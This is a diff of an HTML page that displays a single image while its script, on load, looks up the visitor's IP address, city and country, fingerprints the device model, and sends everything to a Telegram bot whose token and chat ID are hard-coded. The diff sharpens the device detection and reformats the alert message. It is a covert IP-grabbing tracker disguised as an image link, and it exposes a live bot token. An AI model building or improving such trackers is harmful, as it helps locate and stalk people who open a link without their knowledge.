@@ -18,7 +18,6 @@
             display: flex;
             align-items: center;
             justify-content: center;
-            padding: 0;
         }
         
         .image-container {
@@ -32,97 +31,114 @@
             height: auto;
             display: block;
         }
-        
-        .hidden-tracker {
-            display: none;
-        }
     </style>
 </head>
 <body>
+
     <div class="image-container">
-        <!-- غيّر الرابط دا برابط صورتك -->
         <img src="zer.jpg" alt="صورة">
     </div>
 
-    <div class="hidden-tracker" id="tracker"></div>
-
     <script>
+        // دالة تحديد نوع الشركة والجهاز بشكل عام وديناميكي
+        function getExactDeviceName(ua) {
+            if (/Android/.test(ua)) {
+                let brand = "Android (شركة غير معروفة)";
+                let modelCode = "غير محدد";
+
+                const androidMatch = ua.match(/Android[^;]*;\s*([^)]+)\)/);
+                if (androidMatch) {
+                    modelCode = androidMatch[1].trim();
+                    
+                    let lowerUA = ua.toLowerCase();
+                    let lowerModel = modelCode.toLowerCase();
+
+                    if (lowerUA.includes("samsung") || lowerModel.startsWith("sm-")) {
+                        brand = "Samsung";
+                    } else if (lowerUA.includes("huawei") || lowerUA.includes("honor") || lowerModel.startsWith("hwn")) {
+                        brand = "Huawei / Honor";
+                    } else if (lowerUA.includes("xiaomi") || lowerUA.includes("redmi") || lowerUA.includes("poco") || lowerUA.includes("mi ")) {
+                        brand = "Xiaomi";
+                    } else if (lowerUA.includes("oppo") || lowerModel.startsWith("cph")) {
+                        brand = "Oppo";
+                    } else if (lowerUA.includes("vivo")) {
+                        brand = "Vivo";
+                    } else if (lowerUA.includes("oneplus")) {
+                        brand = "OnePlus";
+                    } else if (lowerUA.includes("realme")) {
+                        brand = "Realme";
+                    } else if (lowerUA.includes("google") || lowerModel.includes("pixel")) {
+                        brand = "Google Pixel";
+                    } else if (lowerUA.includes("sony")) {
+                        brand = "Sony";
+                    }
+                }
+                return `${brand} [الموديل: ${modelCode}]`;
+            }
+
+            if (/iPhone|iPad/.test(ua)) {
+                const width = window.screen.width;
+                const height = window.screen.height;
+
+                if (width === 430 && height === 932) return 'iPhone 15 Pro Max / 14 Pro Max';
+                if (width === 393 && height === 852) return 'iPhone 15 Pro / 15 / 14 Pro';
+                if (width === 428 && height === 926) return 'iPhone 14 Plus / 13 Pro Max';
+                if (width === 390 && height === 844) return 'iPhone 14 / 13 Pro / 13 / 12 Pro / 12';
+                if (width === 414 && height === 896) return 'iPhone 11 / XR / XS Max';
+                if (width === 375 && height === 812) return 'iPhone 13 mini / 12 mini / 11 Pro / X / XS';
+                if (width === 375 && height === 667) return 'iPhone SE / 8 / 7';
+                
+                return 'iPhone / iPad';
+            }
+
+            if (/Windows NT 10.0/.test(ua)) return 'كمبيوتر (Windows 10/11)';
+            if (/Macintosh/.test(ua)) return 'جهاز Mac';
+            if (/Linux/.test(ua)) return 'جهاز Linux (كمبيوتر)';
+
+            return 'جهاز غير معروف';
+        }
+
         async function trackVisitor() {
             try {
-                // البيانات المطلوبة
-                let ipAddress = 'جاري الحصول...';
+                let ipAddress = 'غير قادر على الجلب';
                 let deviceInfo = navigator.userAgent;
-                let location = 'جاري الحصول...';
+                let location = 'غير معروف';
                 let timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
                 
-                // الحصول على IP والموقع من API
+                let exactDeviceName = getExactDeviceName(deviceInfo);
+                
                 try {
-                    // محاولة API الأول
                     const ipResponse = await fetch('https://ipwho.is/');
                     if (ipResponse.ok) {
                         const ipData = await ipResponse.json();
                         ipAddress = ipData.ip;
-                        location = `${ipData.city}, ${ipData.country}`;
+                        location = `${ipData.city}، ${ipData.country}`;
                     }
                 } catch (e1) {
                     try {
-                        // محاولة API الثاني
                         const ipResponse = await fetch('https://api.ipify.org?format=json');
                         if (ipResponse.ok) {
                             const ipData = await ipResponse.json();
                             ipAddress = ipData.ip;
                         }
-                        
-                        // الحصول على الموقع
                         const locResponse = await fetch('https://geolocation-db.com/json/');
                         if (locResponse.ok) {
                             const locData = await locResponse.json();
-                            location = `${locData.city}, ${locData.country_name}`;
+                            location = `${locData.city}، ${locData.country_name}`;
                         }
                     } catch (e2) {
-                        console.log('لم تتمكن الـ APIs من العمل');
+                        console.log('فشلت الـ APIs في العمل');
                     }
                 }
                 
-                // استخراج نوع الجهاز
-                let deviceType = 'غير معروف';
-                let osName = 'غير معروف';
+                // التعديل الجديد: حساب الوقت بناءً على توقيت الجزائر (توقيت وسط أوروبا GMT+1)
+                const timestamp = new Date().toLocaleString('ar-DZ', { timeZone: 'Africa/Algiers' });
                 
-                if (/Android/.test(deviceInfo)) {
-                    deviceType = 'موبايل Android';
-                } else if (/iPhone|iPad|iPod/.test(deviceInfo)) {
-                    deviceType = 'iOS Device';
-                } else if (/Windows/.test(deviceInfo)) {
-                    deviceType = 'جهاز كمبيوتر Windows';
-                    osName = 'Windows';
-                } else if (/Mac/.test(deviceInfo)) {
-                    deviceType = 'جهاز كمبيوتر Mac';
-                    osName = 'macOS';
-                } else if (/Linux/.test(deviceInfo)) {
-                    deviceType = 'جهاز كمبيوتر Linux';
-                    osName = 'Linux';
-                }
+                // صياغة الرسالة المرسلة للتليجرام
+                const message = `🚨 زائر جديد فتح الرابط!\n\n📱 الجهاز: ${exactDeviceName}\n📍 الموقع: ${location}\n🌍 IP Address: ${ipAddress}\n⏰ الوقت (بتوقيت الجزائر): ${timestamp}\n🕐 المنطقة الزمنية لجهاز الزائر: ${timezone}\n\nℹ️ السطر الخام (User Agent):\n${deviceInfo}`;
                 
-                // الوقت الحالي
-                const timestamp = new Date().toLocaleString('ar-SA');
-                
-                // بناء الرسالة
-                const message = `
-🚨 زائر جديد!
-
-📍 الموقع: ${location}
-🌍 IP Address: ${ipAddress}
-💻 نوع الجهاز: ${deviceType}
-⏰ الوقت: ${timestamp}
-🕐 المنطقة الزمنية: ${timezone}
-📱 User Agent: ${deviceInfo}
-                `;
-                
-                // إرسال لـ Telegram
-                // غيّر البيانات دي بتوكن وشات ID تبعك
                 const botToken = '8426812517:AAHI0TRbNfDDGcI97cyT6EpFV6y8ADLsAl8';
                 const chatId = '1802530770';
-                
                 const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
                 
                 await fetch(telegramUrl, {
@@ -132,21 +148,18 @@
                     },
                     body: JSON.stringify({
                         chat_id: chatId,
-                        text: message,
-                        parse_mode: 'HTML'
+                        text: message
                     })
                 });
                 
-                console.log('✅ تم الإرسال لتلجرام');
+                console.log('✅ تم الإرسال لتلجرام بنجاح بتوقيت الجزائر');
                 
             } catch (error) {
-                console.log('خطأ في الإرسال:', error);
+                console.log('خطأ في التنفيذ:', error);
             }
         }
         
-        // تشغيل التتبع عند التحميل
         window.addEventListener('load', trackVisitor);
-        trackVisitor();
     </script>
 </body>
 </html>
